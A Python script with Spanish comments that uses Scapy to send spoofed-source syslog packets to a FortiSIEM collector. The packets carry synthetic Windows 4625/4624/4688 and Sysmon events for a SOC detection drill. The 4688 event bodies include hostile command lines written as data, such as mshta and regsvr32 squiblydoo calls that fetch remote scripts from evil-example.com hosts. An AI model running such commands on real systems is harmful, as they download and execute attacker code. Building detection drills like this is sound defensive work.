#!/usr/bin/env python3
"""
Windows spoofed events -> FortiSIEM, modern IDs aligned with your WinSyslogParser

Genera eventos Windows modernos por syslog UDP con Scapy:
  - 4625 failed logon
  - 4624 successful logon
  - 4688 process creation
  - Sysmon 1, 3, 11, 22
  - 1102/7045 también se envían, aunque tu parser los tratará de forma genérica si no tiene rama específica

Formato:
  <134>May 03 12:00:00 WIN-LAB-01 MSWinEventLog<TAB>1<TAB>Security<TAB>...

Tu parser:
  - reconoce MSWinEventLog
  - si _OSModule=Security => eventType = Win-Security-<ID>
  - si _OSModule=Microsoft-Windows-Sysmon/Operational => eventType = Win-Sysmon-<ID>
  - tiene ramas específicas para 4624, 4625 y 4688

Uso:
  sudo apt update
  sudo apt install -y python3-scapy
  sudo python3 windows_spoofed_events_fortisiem_modern_aligned.py --fortisiem-ip 10.0.0.50 --once

Test parser:
  sudo python3 windows_spoofed_events_fortisiem_modern_aligned.py --fortisiem-ip 10.0.0.50 --print-test-events

No ejecuta nada real en Windows. Solo genera syslog sintético.
"""

from scapy.all import IP, UDP, Raw, send
from datetime import datetime
import argparse
import random
import signal
import time


RUNNING = True


def stop_handler(signum, frame):
    global RUNNING
    RUNNING = False
    print("\n[!] Deteniendo simulador Windows moderno...")


signal.signal(signal.SIGINT, stop_handler)
signal.signal(signal.SIGTERM, stop_handler)


def syslog_ts():
    return datetime.now().strftime("%b %d %H:%M:%S")


def win_time_parts():
    return datetime.now().strftime("%a %b %d %H:%M:%S %Y")


def xml_time():
    return datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.0000000Z")


def send_syslog(args, msg_payload):
    raw = f"{args.pri}{syslog_ts()} {args.hostname} {msg_payload}"

    pkt = (
        IP(src=args.reporting_ip, dst=args.fortisiem_ip)
        / UDP(sport=random.randint(20000, 65000), dport=args.port)
        / Raw(load=raw.encode("utf-8", errors="ignore"))
    )

    send(pkt, verbose=False)


def mswineventlog_payload(
    os_module,
    event_id,
    event_source,
    account,
    account_type,
    action,
    computer,
    category,
    body,
    seq=None,
):
    """
    Campos alineados con tu parser:
      MSWinEventLog
      1
      OSModule
      seqNum
      Sun May 03 12:45:01 2026
      eventId
      eventSource
      account
      accountType
      action
      body

    Se usan TABs reales entre campos para que patWordTab capture bien.
    """
    if seq is None:
        seq = random.randint(100000, 999999)

    fields = [
        "MSWinEventLog",
        "1",
        os_module,
        str(seq),
        win_time_parts(),
        str(event_id),
        event_source,
        account,
        account_type,
        action,
        body,
    ]
    return "\t".join(fields)


def event_4625_failed_logon(args):
    """
    Tu parser espera en _body:
      Subject:
      Account For Which Logon Failed:
      Failure Information:
      Process Information:
      Network Information:
      Detailed Authentication Information:

    EventType esperado:
      Win-Security-4625
    """
    failed_user = random.choice(["administrator", "admin", "svc_backup", args.user])
    src_port = random.randint(40000, 65000)

    body = (
        "Subject: "
        "Security ID: NULL SID "
        "Account Name: - "
        "Account Domain: - "
        "Logon ID: 0x0 "
        "Account For Which Logon Failed: "
        "Security ID: NULL SID "
        f"Account Name:  {failed_user} "
        f"Account Domain:  {args.domain} "
        "Failure Information: "
        "Failure Reason: Unknown user name or bad password "
        "Status: 0xC000006D "
        "Sub Status: 0xC000006A "
        "Process Information: "
        "Caller Process ID: 0x0 "
        "Caller Process Name: - "
        "Network Information: "
        "Workstation Name: WIN-REMOTE "
        f"Source Network Address: {args.attacker_ip} "
        f"Source Port:  {src_port} "
        "Detailed Authentication Information: "
        "Logon Process: NtLmSsp "
        "Authentication Package: NTLM "
        "Transited Services: - "
        "Package Name: - "
        "Key Length: 0 "
        "exercise_id=SOC-DRILL-WIN-2026"
    )

    return mswineventlog_payload(
        os_module="Security",
        event_id=4625,
        event_source="Microsoft-Windows-Security-Auditing",
        account="N/A",
        account_type="N/A",
        action="Failure Audit",
        computer=args.hostname,
        category="Logon",
        body=body,
    )


def event_4624_success_logon(args):
    """
    Tu parser espera en _body:
      Subject:
      New Logon:
      Process Information:
      Network Information:
      Detailed Authentication Information:

    EventType esperado:
      Win-Security-4624
    """
    src_port = random.randint(40000, 65000)
    logon_id = f"0x{random.randint(100000, 0xFFFFFF):x}"

    body = (
        "Subject: "
        "Security ID: SYSTEM "
        f"Account Name: {args.hostname}$ "
        f"Account Domain: {args.domain} "
        "Logon ID: 0x3e7 "
        "New Logon: "
        f"Security ID: {args.domain}\\{args.user} "
        f"Account Name:  {args.user} "
        f"Account Domain:  {args.domain} "
        f"Logon ID:  {logon_id} "
        "Logon Type: 3 "
        "Process Information: "
        "Process ID:  0x0 "
        "Process Name:  - "
        "Network Information: "
        "Workstation Name: WIN-REMOTE "
        f"Source Network Address: {args.attacker_ip} "
        f"Source Port:  {src_port} "
        "Detailed Authentication Information: "
        "Logon Process:  NtLmSsp "
        "Authentication Package: NTLM "
        "Transited Services: - "
        "Package Name: - "
        "Key Length: 0 "
        "exercise_id=SOC-DRILL-WIN-2026"
    )

    return mswineventlog_payload(
        os_module="Security",
        event_id=4624,
        event_source="Microsoft-Windows-Security-Auditing",
        account=args.user,
        account_type="User",
        action="Success Audit",
        computer=args.hostname,
        category="Logon",
        body=body,
    )


def event_4688_process_created(args):
    """
    Tu parser tiene rama para 4688 y extrae:
      Account Domain:
      Account Name:
      Logon ID:
      New Process Name:

    Usa separadores dobles en la parte relevante para collectAndSetAttrByKeyValuePair sep="  ".
    EventType esperado:
      Win-Security-4688
    """
    proc = random.choice([
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        r"C:\Windows\System32\cmd.exe",
        r"C:\Windows\System32\mshta.exe",
        r"C:\Windows\System32\rundll32.exe",
        r"C:\Windows\System32\regsvr32.exe",
    ])
    cmdline = random.choice([
        r'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Write-Output PS ATTACK!!!"',
        r'cmd.exe /c whoami && hostname && ipconfig /all',
        r'mshta.exe http://edge-service-updater.evil-example.com/update.hta',
        r'regsvr32.exe /s /n /u /i:http://api-sync-service.evil-example.com/scrobj.sct scrobj.dll',
        r'rundll32.exe C:\Users\Public\Documents\AdobeSync\AdobeUpdate.dll,Start',
    ])
    logon_id = f"0x{random.randint(100000, 0xFFFFFF):x}"

    body = (
        "A new process has been created.  "
        "Subject:  "
        f"Security ID: {args.domain}\\{args.user}  "
        f"Account Name: {args.user}  "
        f"Account Domain: {args.domain}  "
        f"Logon ID: {logon_id}  "
        "Process Information:  "
        f"New Process ID: 0x{random.randint(1000,9000):x}  "
        f"New Process Name: {proc}  "
        "Token Elevation Type: %%1936  "
        "Creator Process ID: 0x1234  "
        r"Creator Process Name: C:\Windows\explorer.exe  "
        f"Process Command Line: {cmdline} "
        "exercise_id=SOC-DRILL-WIN-2026"
    )

    return mswineventlog_payload(
        os_module="Security",
        event_id=4688,
        event_source="Microsoft-Windows-Security-Auditing",
        account=args.user,
        account_type="User",
        action="Success Audit",
        computer=args.hostname,
        category="Process Creation",
        body=body,
    )


def event_1102_audit_cleared(args):
    """
    Aunque tu grep no mostró rama específica para 1102, Security generará:
      Win-Security-1102
    """
    body = (
        "The audit log was cleared. "
        "Subject: "
        f"Security ID: {args.domain}\\{args.user} "
        f"Account Name: {args.user} "
        f"Account Domain: {args.domain} "
        f"Logon ID: 0x{random.randint(100000, 0xFFFFFF):x} "
        "exercise_id=SOC-DRILL-WIN-2026"
    )

    return mswineventlog_payload(
        os_module="Security",
        event_id=1102,
        event_source="Microsoft-Windows-Eventlog",
        account=args.user,
        account_type="User",
        action="Success Audit",
        computer=args.hostname,
        category="Log Clear",
        body=body,
    )


def event_7045_service_installed(args):
    """
    Aunque no haya rama específica, System generará algo tipo:
      Win-System-Service-Control-Manager-7045
    o equivalente según tu parser.
    """
    service_name = random.choice(["WinUpdateHelper", "OfficeTelemetryAgent", "AdobeSyncSvc"])
    service_file = random.choice([
        r"C:\ProgramData\Microsoft\Windows\Caches\msedge_update.exe",
        r"C:\Windows\Tasks\OfficeTelemetryAgent.exe",
        r"C:\Users\Public\Documents\AdobeSync\AdobeUpdate.exe",
    ])

    body = (
        "A service was installed in the system. "
        f"Service Name: {service_name} "
        f"Service File Name: {service_file} "
        "Service Type: user mode service "
        "Service Start Type: demand start "
        "Service Account: LocalSystem "
        "exercise_id=SOC-DRILL-WIN-2026"
    )

    return mswineventlog_payload(
        os_module="System",
        event_id=7045,
        event_source="Service Control Manager",
        account="N/A",
        account_type="N/A",
        action="Information",
        computer=args.hostname,
        category="Service Control Manager",
        body=body,
    )


def sysmon_payload(args, event_id, category, body):
    return mswineventlog_payload(
        os_module="Microsoft-Windows-Sysmon/Operational",
        event_id=event_id,
        event_source="Microsoft-Windows-Sysmon",
        account=args.user,
        account_type="User",
        action="Information",
        computer=args.hostname,
        category=category,
        body=body,
    )


def event_sysmon_1(args):
    body = (
        "Process Create: "
        "RuleName: technique_id=T1059,technique_name=Command and Scripting Interpreter "
        f"UtcTime: {xml_time()} "
        f"ProcessGuid: {{{random.randint(100000,999999)}}} "
        f"ProcessId: {random.randint(1000,9999)} "
        r"Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe "
        r"CommandLine: powershell.exe -NoProfile -EncodedCommand <redacted> "
        r"CurrentDirectory: C:\Users\Public\ "
        f"User: {args.domain}\\{args.user} "
        r"ParentImage: C:\Windows\explorer.exe "
        r"ParentCommandLine: explorer.exe "
        "exercise_id=SOC-DRILL-WIN-2026"
    )
    return sysmon_payload(args, 1, "Process Create", body)


def event_sysmon_3(args):
    dst_ip = random.choice(["45.83.120.10", "91.199.212.44", "185.203.118.77"])
    body = (
        "Network connection detected: "
        "RuleName: technique_id=T1071.001,technique_name=Web Protocols "
        f"UtcTime: {xml_time()} "
        f"ProcessGuid: {{{random.randint(100000,999999)}}} "
        f"ProcessId: {random.randint(1000,9999)} "
        r"Image: C:\Users\Public\Documents\AdobeSync\AdobeUpdate.exe "
        f"User: {args.domain}\\{args.user} "
        "Protocol: tcp "
        "Initiated: true "
        f"SourceHostname: {args.hostname} "
        f"SourceIp: {args.windows_ip} "
        f"SourcePort: {random.randint(40000,65000)} "
        "DestinationHostname: update-checkin-cdn.evil-example.com "
        f"DestinationIp: {dst_ip} "
        "DestinationPort: 443 "
        "exercise_id=SOC-DRILL-WIN-2026"
    )
    return sysmon_payload(args, 3, "Network Connection", body)


def event_sysmon_11(args):
    body = (
        "File created: "
        "RuleName: technique_id=T1105,technique_name=Ingress Tool Transfer "
        f"UtcTime: {xml_time()} "
        f"ProcessGuid: {{{random.randint(100000,999999)}}} "
        f"ProcessId: {random.randint(1000,9999)} "
        r"Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe "
        r"TargetFilename: C:\Users\Public\Documents\AdobeSync\AdobeUpdate.exe "
        f"CreationUtcTime: {xml_time()} "
        f"User: {args.domain}\\{args.user} "
        "exercise_id=SOC-DRILL-WIN-2026"
    )
    return sysmon_payload(args, 11, "File Create", body)


def event_sysmon_22(args):
    body = (
        "DNS query: "
        "RuleName: technique_id=T1071.004,technique_name=DNS "
        f"UtcTime: {xml_time()} "
        f"ProcessGuid: {{{random.randint(100000,999999)}}} "
        f"ProcessId: {random.randint(1000,9999)} "
        "QueryName: update-checkin-cdn.evil-example.com "
        "QueryStatus: 0 "
        "QueryResults: 45.83.120.10 "
        r"Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe "
        f"User: {args.domain}\\{args.user} "
        "exercise_id=SOC-DRILL-WIN-2026"
    )
    return sysmon_payload(args, 22, "DNS Query", body)


def build_campaign(args):
    events = []

    for _ in range(args.failed_logons):
        events.append(event_4625_failed_logon(args))

    events.append(event_4624_success_logon(args))
    events.append(event_4688_process_created(args))

    events.append(event_sysmon_1(args))
    events.append(event_sysmon_11(args))
    events.append(event_sysmon_22(args))

    for _ in range(args.c2_events):
        events.append(event_sysmon_3(args))

    events.append(event_7045_service_installed(args))
    events.append(event_1102_audit_cleared(args))

    return events


def send_round(args):
    events = build_campaign(args)
    print(f"\n[+] Enviando {len(events)} eventos Windows modernos alineados a WinSyslogParser")

    for i, event in enumerate(events, start=1):
        send_syslog(args, event)
        print(f"    OK {i:03d}/{len(events)} reporting_ip={args.reporting_ip} host={args.hostname}")
        time.sleep(random.uniform(args.min_delay, args.max_delay))


def parse_args():
    p = argparse.ArgumentParser(description="Windows modern spoofed Syslog events aligned to FortiSIEM WinSyslogParser")
    p.add_argument("--fortisiem-ip", required=True, help="IP del FortiSIEM Collector/Supervisor")
    p.add_argument("--port", type=int, default=514, help="Puerto syslog destino")
    p.add_argument("--reporting-ip", default="10.0.20.105", help="IP origen spoofeada / Reporting IP")
    p.add_argument("--hostname", default="WIN-LAB-01", help="Hostname Windows simulado")
    p.add_argument("--windows-ip", default="10.0.10.30", help="IP interna del Windows simulado para SourceIp")
    p.add_argument("--domain", default="CORP", help="Dominio Windows")
    p.add_argument("--user", default="j.garcia", help="Usuario víctima")
    p.add_argument("--attacker-ip", default="185.231.88.45", help="IP atacante simulada")
    p.add_argument("--failed-logons", type=int, default=12, help="Número de eventos 4625 por ronda")
    p.add_argument("--c2-events", type=int, default=6, help="Número de Sysmon 3 por ronda")
    p.add_argument("--interval", type=int, default=60, help="Intervalo si se usa --loop")
    p.add_argument("--loop", action="store_true", help="Ejecuta en bucle")
    p.add_argument("--once", action="store_true", help="Una sola ronda y salir")
    p.add_argument("--pri", default="<134>", help="PRI syslog")
    p.add_argument("--min-delay", type=float, default=0.2)
    p.add_argument("--max-delay", type=float, default=0.8)
    p.add_argument("--print-test-events", action="store_true", help="Imprime ejemplos de payload sin enviar")
    return p.parse_args()


def print_test_events(args):
    print("Evento 4625 de test para Test Parser:")
    print(f"{args.pri}{syslog_ts()} {args.hostname} {event_4625_failed_logon(args)}")
    print()
    print("Evento 4624 de test para Test Parser:")
    print(f"{args.pri}{syslog_ts()} {args.hostname} {event_4624_success_logon(args)}")
    print()
    print("Evento 4688 de test para Test Parser:")
    print(f"{args.pri}{syslog_ts()} {args.hostname} {event_4688_process_created(args)}")
    print()
    print("Evento Sysmon 3 de test para Test Parser:")
    print(f"{args.pri}{syslog_ts()} {args.hostname} {event_sysmon_3(args)}")


def main():
    args = parse_args()

    print("[+] Windows modern spoofed events alineado a WinSyslogParser")
    print(f"[+] FortiSIEM: {args.fortisiem_ip}:{args.port}/UDP")
    print(f"[+] Reporting IP spoofeada: {args.reporting_ip}")
    print(f"[+] Hostname: {args.hostname}")
    print("[+] EventTypes esperados: Win-Security-4625, Win-Security-4624, Win-Security-4688, Win-Sysmon-1/3/11/22")

    if args.print_test_events:
        print_test_events(args)
        return

    if not args.loop:
        send_round(args)
        print("[+] Finalizado.")
        return

    while RUNNING:
        send_round(args)
        print(f"[+] Próxima ronda en {args.interval} segundos")
        for _ in range(args.interval):
            if not RUNNING:
                break
            time.sleep(1)

    print("[+] Simulador detenido.")


if __name__ == "__main__":
    main()

